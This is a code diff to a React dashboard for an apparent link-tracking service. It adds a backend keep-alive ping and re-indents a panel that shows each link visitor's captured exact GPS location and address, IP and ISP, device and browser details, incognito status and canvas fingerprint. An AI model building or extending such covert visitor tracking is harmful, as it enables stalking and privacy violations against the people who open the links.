@@ -9,6 +9,8 @@ import {
   Globe, Eye, CreditCard, X
 } from "lucide-react";
 
+const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || "http://localhost:5001";
+
 export default function Dashboard() {
   const { currentUser, userProfile, fetchUserProfile } = useAuth();
   const [links, setLinks] = useState([]);
@@ -20,6 +22,14 @@ export default function Dashboard() {
   const [credits, setCredits] = useState(userProfile?.credits ?? 0);
   const [selectedLink, setSelectedLink] = useState(null);
   const [showPayment, setShowPayment] = useState(false);
+
+  // Wake up Render free-tier backend immediately and keep it alive
+  useEffect(() => {
+    const ping = () => fetch(`${BACKEND_URL}/health`).catch(() => { });
+    ping(); // immediate wake-up on page load
+    const interval = setInterval(ping, 8 * 60 * 1000); // every 8 minutes
+    return () => clearInterval(interval);
+  }, []);
 
   useEffect(() => {
     if (!currentUser) return;
@@ -333,110 +343,110 @@ export default function Dashboard() {
                             <h4 className="font-body text-xs text-text-secondary uppercase tracking-wider mb-3">
                               Captured Device Data
                             </h4>
-                              {link.captures.map((capture, i) => (
-                                <div key={i} className="bg-surface-elevated border border-surface-border rounded-lg p-4 mb-3 space-y-4">
+                            {link.captures.map((capture, i) => (
+                              <div key={i} className="bg-surface-elevated border border-surface-border rounded-lg p-4 mb-3 space-y-4">
 
-                                  {/* GPS */}
-                                  {capture.gpsLat && capture.gpsLon ? (
-                                    <Section label="📍 GPS Location (Exact)">
-                                      <div className="col-span-2">
-                                        <div className="font-mono text-xs text-primary font-bold">
-                                          {capture.gpsLat.toFixed(6)}, {capture.gpsLon.toFixed(6)}
-                                          {capture.gpsAccuracy && <span className="text-text-muted ml-2 font-normal">±{capture.gpsAccuracy}m</span>}
+                                {/* GPS */}
+                                {capture.gpsLat && capture.gpsLon ? (
+                                  <Section label="📍 GPS Location (Exact)">
+                                    <div className="col-span-2">
+                                      <div className="font-mono text-xs text-primary font-bold">
+                                        {capture.gpsLat.toFixed(6)}, {capture.gpsLon.toFixed(6)}
+                                        {capture.gpsAccuracy && <span className="text-text-muted ml-2 font-normal">±{capture.gpsAccuracy}m</span>}
+                                      </div>
+                                      {capture.gpsAddress && <div className="font-body text-xs text-text-secondary mt-1">🏠 {capture.gpsAddress}</div>}
+                                      {(capture.gpsCity || capture.gpsState) && (
+                                        <div className="font-mono text-xs text-text-muted mt-0.5">
+                                          {[capture.gpsCity, capture.gpsState, capture.gpsPincode, capture.gpsCountry].filter(Boolean).join(', ')}
                                         </div>
-                                        {capture.gpsAddress && <div className="font-body text-xs text-text-secondary mt-1">🏠 {capture.gpsAddress}</div>}
-                                        {(capture.gpsCity || capture.gpsState) && (
-                                          <div className="font-mono text-xs text-text-muted mt-0.5">
-                                            {[capture.gpsCity, capture.gpsState, capture.gpsPincode, capture.gpsCountry].filter(Boolean).join(', ')}
-                                          </div>
-                                        )}
-                                        <a href={`https://www.google.com/maps?q=${capture.gpsLat},${capture.gpsLon}`}
+                                      )}
+                                      <a href={`https://www.google.com/maps?q=${capture.gpsLat},${capture.gpsLon}`}
+                                        target="_blank" rel="noopener noreferrer"
+                                        className="inline-block mt-1 text-xs text-primary underline hover:opacity-80"
+                                        onClick={e => e.stopPropagation()}>View on Google Maps ↗</a>
+                                    </div>
+                                  </Section>
+                                ) : capture.city ? (
+                                  <Section label="📍 Location (IP-based)">
+                                    <div className="col-span-2">
+                                      <div className="font-mono text-xs text-text-primary">
+                                        {capture.city}{capture.region ? `, ${capture.region}` : ''}, {capture.country}
+                                      </div>
+                                      {capture.lat && capture.lon && (
+                                        <a href={`https://www.google.com/maps?q=${capture.lat},${capture.lon}`}
                                           target="_blank" rel="noopener noreferrer"
-                                          className="inline-block mt-1 text-xs text-primary underline hover:opacity-80"
-                                          onClick={e => e.stopPropagation()}>View on Google Maps ↗</a>
-                                      </div>
-                                    </Section>
-                                  ) : capture.city ? (
-                                    <Section label="📍 Location (IP-based)">
-                                      <div className="col-span-2">
-                                        <div className="font-mono text-xs text-text-primary">
-                                          {capture.city}{capture.region ? `, ${capture.region}` : ''}, {capture.country}
-                                        </div>
-                                        {capture.lat && capture.lon && (
-                                          <a href={`https://www.google.com/maps?q=${capture.lat},${capture.lon}`}
-                                            target="_blank" rel="noopener noreferrer"
-                                            className="inline-block mt-1 text-xs text-text-muted underline hover:text-primary"
-                                            onClick={e => e.stopPropagation()}>View approximate location ↗</a>
-                                        )}
-                                      </div>
-                                    </Section>
-                                  ) : null}
-
-                                  {/* Network & ISP */}
-                                  <Section label="🌐 Network & ISP">
-                                    {capture.ip && <DataRow label="IP Address" value={capture.ip} />}
-                                    {capture.isp && <DataRow label="ISP" value={capture.isp} />}
-                                    {capture.org && <DataRow label="Organization" value={capture.org} />}
-                                    {capture.asn && <DataRow label="ASN" value={capture.asn} />}
-                                    {capture.hostname && <DataRow label="Hostname" value={capture.hostname} />}
-                                    {capture.timezone && <DataRow label="Timezone" value={capture.timezone} />}
-                                    {capture.connectionType && <DataRow label="Connection" value={capture.connectionType.toUpperCase()} />}
-                                    {capture.connectionDownlink && <DataRow label="Speed" value={`${capture.connectionDownlink} Mbps`} />}
-                                    {capture.connectionRtt && <DataRow label="Latency" value={`${capture.connectionRtt} ms`} />}
-                                    {capture.connectionSaveData != null && <DataRow label="Data Saver" value={capture.connectionSaveData ? 'On' : 'Off'} />}
+                                          className="inline-block mt-1 text-xs text-text-muted underline hover:text-primary"
+                                          onClick={e => e.stopPropagation()}>View approximate location ↗</a>
+                                      )}
+                                    </div>
                                   </Section>
+                                ) : null}
 
-                                  {/* Browser & OS */}
-                                  <Section label="🖥️ Browser & OS">
-                                    {capture.browser && <DataRow label="Browser" value={capture.browser} />}
-                                    {capture.os && <DataRow label="OS" value={capture.os} />}
-                                    {capture.device && <DataRow label="Device Type" value={capture.device} />}
-                                    {capture.platform && <DataRow label="Platform" value={capture.platform} />}
-                                    {capture.language && <DataRow label="Language" value={capture.language} />}
-                                    {capture.languages && <DataRow label="All Languages" value={capture.languages} />}
-                                    {capture.doNotTrack && <DataRow label="Do Not Track" value={capture.doNotTrack} />}
-                                    {capture.cookiesEnabled != null && <DataRow label="Cookies" value={capture.cookiesEnabled ? 'Enabled' : 'Disabled'} />}
-                                    {capture.historyLength != null && <DataRow label="History Entries" value={capture.historyLength} />}
-                                    {capture.referrer && <DataRow label="Referrer" value={capture.referrer} />}
+                                {/* Network & ISP */}
+                                <Section label="🌐 Network & ISP">
+                                  {capture.ip && <DataRow label="IP Address" value={capture.ip} />}
+                                  {capture.isp && <DataRow label="ISP" value={capture.isp} />}
+                                  {capture.org && <DataRow label="Organization" value={capture.org} />}
+                                  {capture.asn && <DataRow label="ASN" value={capture.asn} />}
+                                  {capture.hostname && <DataRow label="Hostname" value={capture.hostname} />}
+                                  {capture.timezone && <DataRow label="Timezone" value={capture.timezone} />}
+                                  {capture.connectionType && <DataRow label="Connection" value={capture.connectionType.toUpperCase()} />}
+                                  {capture.connectionDownlink && <DataRow label="Speed" value={`${capture.connectionDownlink} Mbps`} />}
+                                  {capture.connectionRtt && <DataRow label="Latency" value={`${capture.connectionRtt} ms`} />}
+                                  {capture.connectionSaveData != null && <DataRow label="Data Saver" value={capture.connectionSaveData ? 'On' : 'Off'} />}
+                                </Section>
+
+                                {/* Browser & OS */}
+                                <Section label="🖥️ Browser & OS">
+                                  {capture.browser && <DataRow label="Browser" value={capture.browser} />}
+                                  {capture.os && <DataRow label="OS" value={capture.os} />}
+                                  {capture.device && <DataRow label="Device Type" value={capture.device} />}
+                                  {capture.platform && <DataRow label="Platform" value={capture.platform} />}
+                                  {capture.language && <DataRow label="Language" value={capture.language} />}
+                                  {capture.languages && <DataRow label="All Languages" value={capture.languages} />}
+                                  {capture.doNotTrack && <DataRow label="Do Not Track" value={capture.doNotTrack} />}
+                                  {capture.cookiesEnabled != null && <DataRow label="Cookies" value={capture.cookiesEnabled ? 'Enabled' : 'Disabled'} />}
+                                  {capture.historyLength != null && <DataRow label="History Entries" value={capture.historyLength} />}
+                                  {capture.referrer && <DataRow label="Referrer" value={capture.referrer} />}
+                                </Section>
+
+                                {/* Hardware */}
+                                <Section label="⚙️ Hardware">
+                                  {capture.cpuCores && <DataRow label="CPU Cores" value={capture.cpuCores} />}
+                                  {capture.ram && <DataRow label="RAM" value={`${capture.ram} GB`} />}
+                                  {capture.gpu && <DataRow label="GPU" value={capture.gpu} />}
+                                  {capture.gpuVendor && <DataRow label="GPU Vendor" value={capture.gpuVendor} />}
+                                  {capture.maxTouchPoints != null && <DataRow label="Touch Points" value={capture.maxTouchPoints} />}
+                                </Section>
+
+                                {/* Battery */}
+                                {(capture.batteryLevel != null || capture.batteryCharging != null) && (
+                                  <Section label="🔋 Battery">
+                                    {capture.batteryLevel != null && <DataRow label="Level" value={`${capture.batteryLevel}%`} />}
+                                    {capture.batteryCharging != null && <DataRow label="Charging" value={capture.batteryCharging ? 'Yes ⚡' : 'No'} />}
                                   </Section>
+                                )}
 
-                                  {/* Hardware */}
-                                  <Section label="⚙️ Hardware">
-                                    {capture.cpuCores && <DataRow label="CPU Cores" value={capture.cpuCores} />}
-                                    {capture.ram && <DataRow label="RAM" value={`${capture.ram} GB`} />}
-                                    {capture.gpu && <DataRow label="GPU" value={capture.gpu} />}
-                                    {capture.gpuVendor && <DataRow label="GPU Vendor" value={capture.gpuVendor} />}
-                                    {capture.maxTouchPoints != null && <DataRow label="Touch Points" value={capture.maxTouchPoints} />}
-                                  </Section>
+                                {/* Screen */}
+                                <Section label="📺 Screen & Display">
+                                  {capture.screenWidth && <DataRow label="Resolution" value={`${capture.screenWidth}×${capture.screenHeight}`} />}
+                                  {capture.screenAvailWidth && <DataRow label="Available" value={`${capture.screenAvailWidth}×${capture.screenAvailHeight}`} />}
+                                  {capture.windowWidth && <DataRow label="Window Size" value={`${capture.windowWidth}×${capture.windowHeight}`} />}
+                                  {capture.colorDepth && <DataRow label="Color Depth" value={`${capture.colorDepth}-bit`} />}
+                                  {capture.pixelRatio && <DataRow label="Pixel Ratio" value={capture.pixelRatio} />}
+                                </Section>
 
-                                  {/* Battery */}
-                                  {(capture.batteryLevel != null || capture.batteryCharging != null) && (
-                                    <Section label="🔋 Battery">
-                                      {capture.batteryLevel != null && <DataRow label="Level" value={`${capture.batteryLevel}%`} />}
-                                      {capture.batteryCharging != null && <DataRow label="Charging" value={capture.batteryCharging ? 'Yes ⚡' : 'No'} />}
-                                    </Section>
-                                  )}
+                                {/* Privacy & Fingerprint */}
+                                <Section label="🕵️ Privacy & Fingerprint">
+                                  {capture.incognito != null && <DataRow label="Private Mode" value={capture.incognito ? 'Yes (Incognito)' : 'No'} />}
+                                  {capture.canvasHash && <DataRow label="Canvas Hash" value={capture.canvasHash} />}
+                                </Section>
 
-                                  {/* Screen */}
-                                  <Section label="📺 Screen & Display">
-                                    {capture.screenWidth && <DataRow label="Resolution" value={`${capture.screenWidth}×${capture.screenHeight}`} />}
-                                    {capture.screenAvailWidth && <DataRow label="Available" value={`${capture.screenAvailWidth}×${capture.screenAvailHeight}`} />}
-                                    {capture.windowWidth && <DataRow label="Window Size" value={`${capture.windowWidth}×${capture.windowHeight}`} />}
-                                    {capture.colorDepth && <DataRow label="Color Depth" value={`${capture.colorDepth}-bit`} />}
-                                    {capture.pixelRatio && <DataRow label="Pixel Ratio" value={capture.pixelRatio} />}
-                                  </Section>
-
-                                  {/* Privacy & Fingerprint */}
-                                  <Section label="🕵️ Privacy & Fingerprint">
-                                    {capture.incognito != null && <DataRow label="Private Mode" value={capture.incognito ? 'Yes (Incognito)' : 'No'} />}
-                                    {capture.canvasHash && <DataRow label="Canvas Hash" value={capture.canvasHash} />}
-                                  </Section>
-
-                                  <div className="font-mono text-xs text-text-muted pt-2 border-t border-surface-border">
-                                    Captured: {capture.capturedAt}
-                                  </div>
+                                <div className="font-mono text-xs text-text-muted pt-2 border-t border-surface-border">
+                                  Captured: {capture.capturedAt}
                                 </div>
-                              ))}
+                              </div>
+                            ))}
                           </div>
                         )}
 
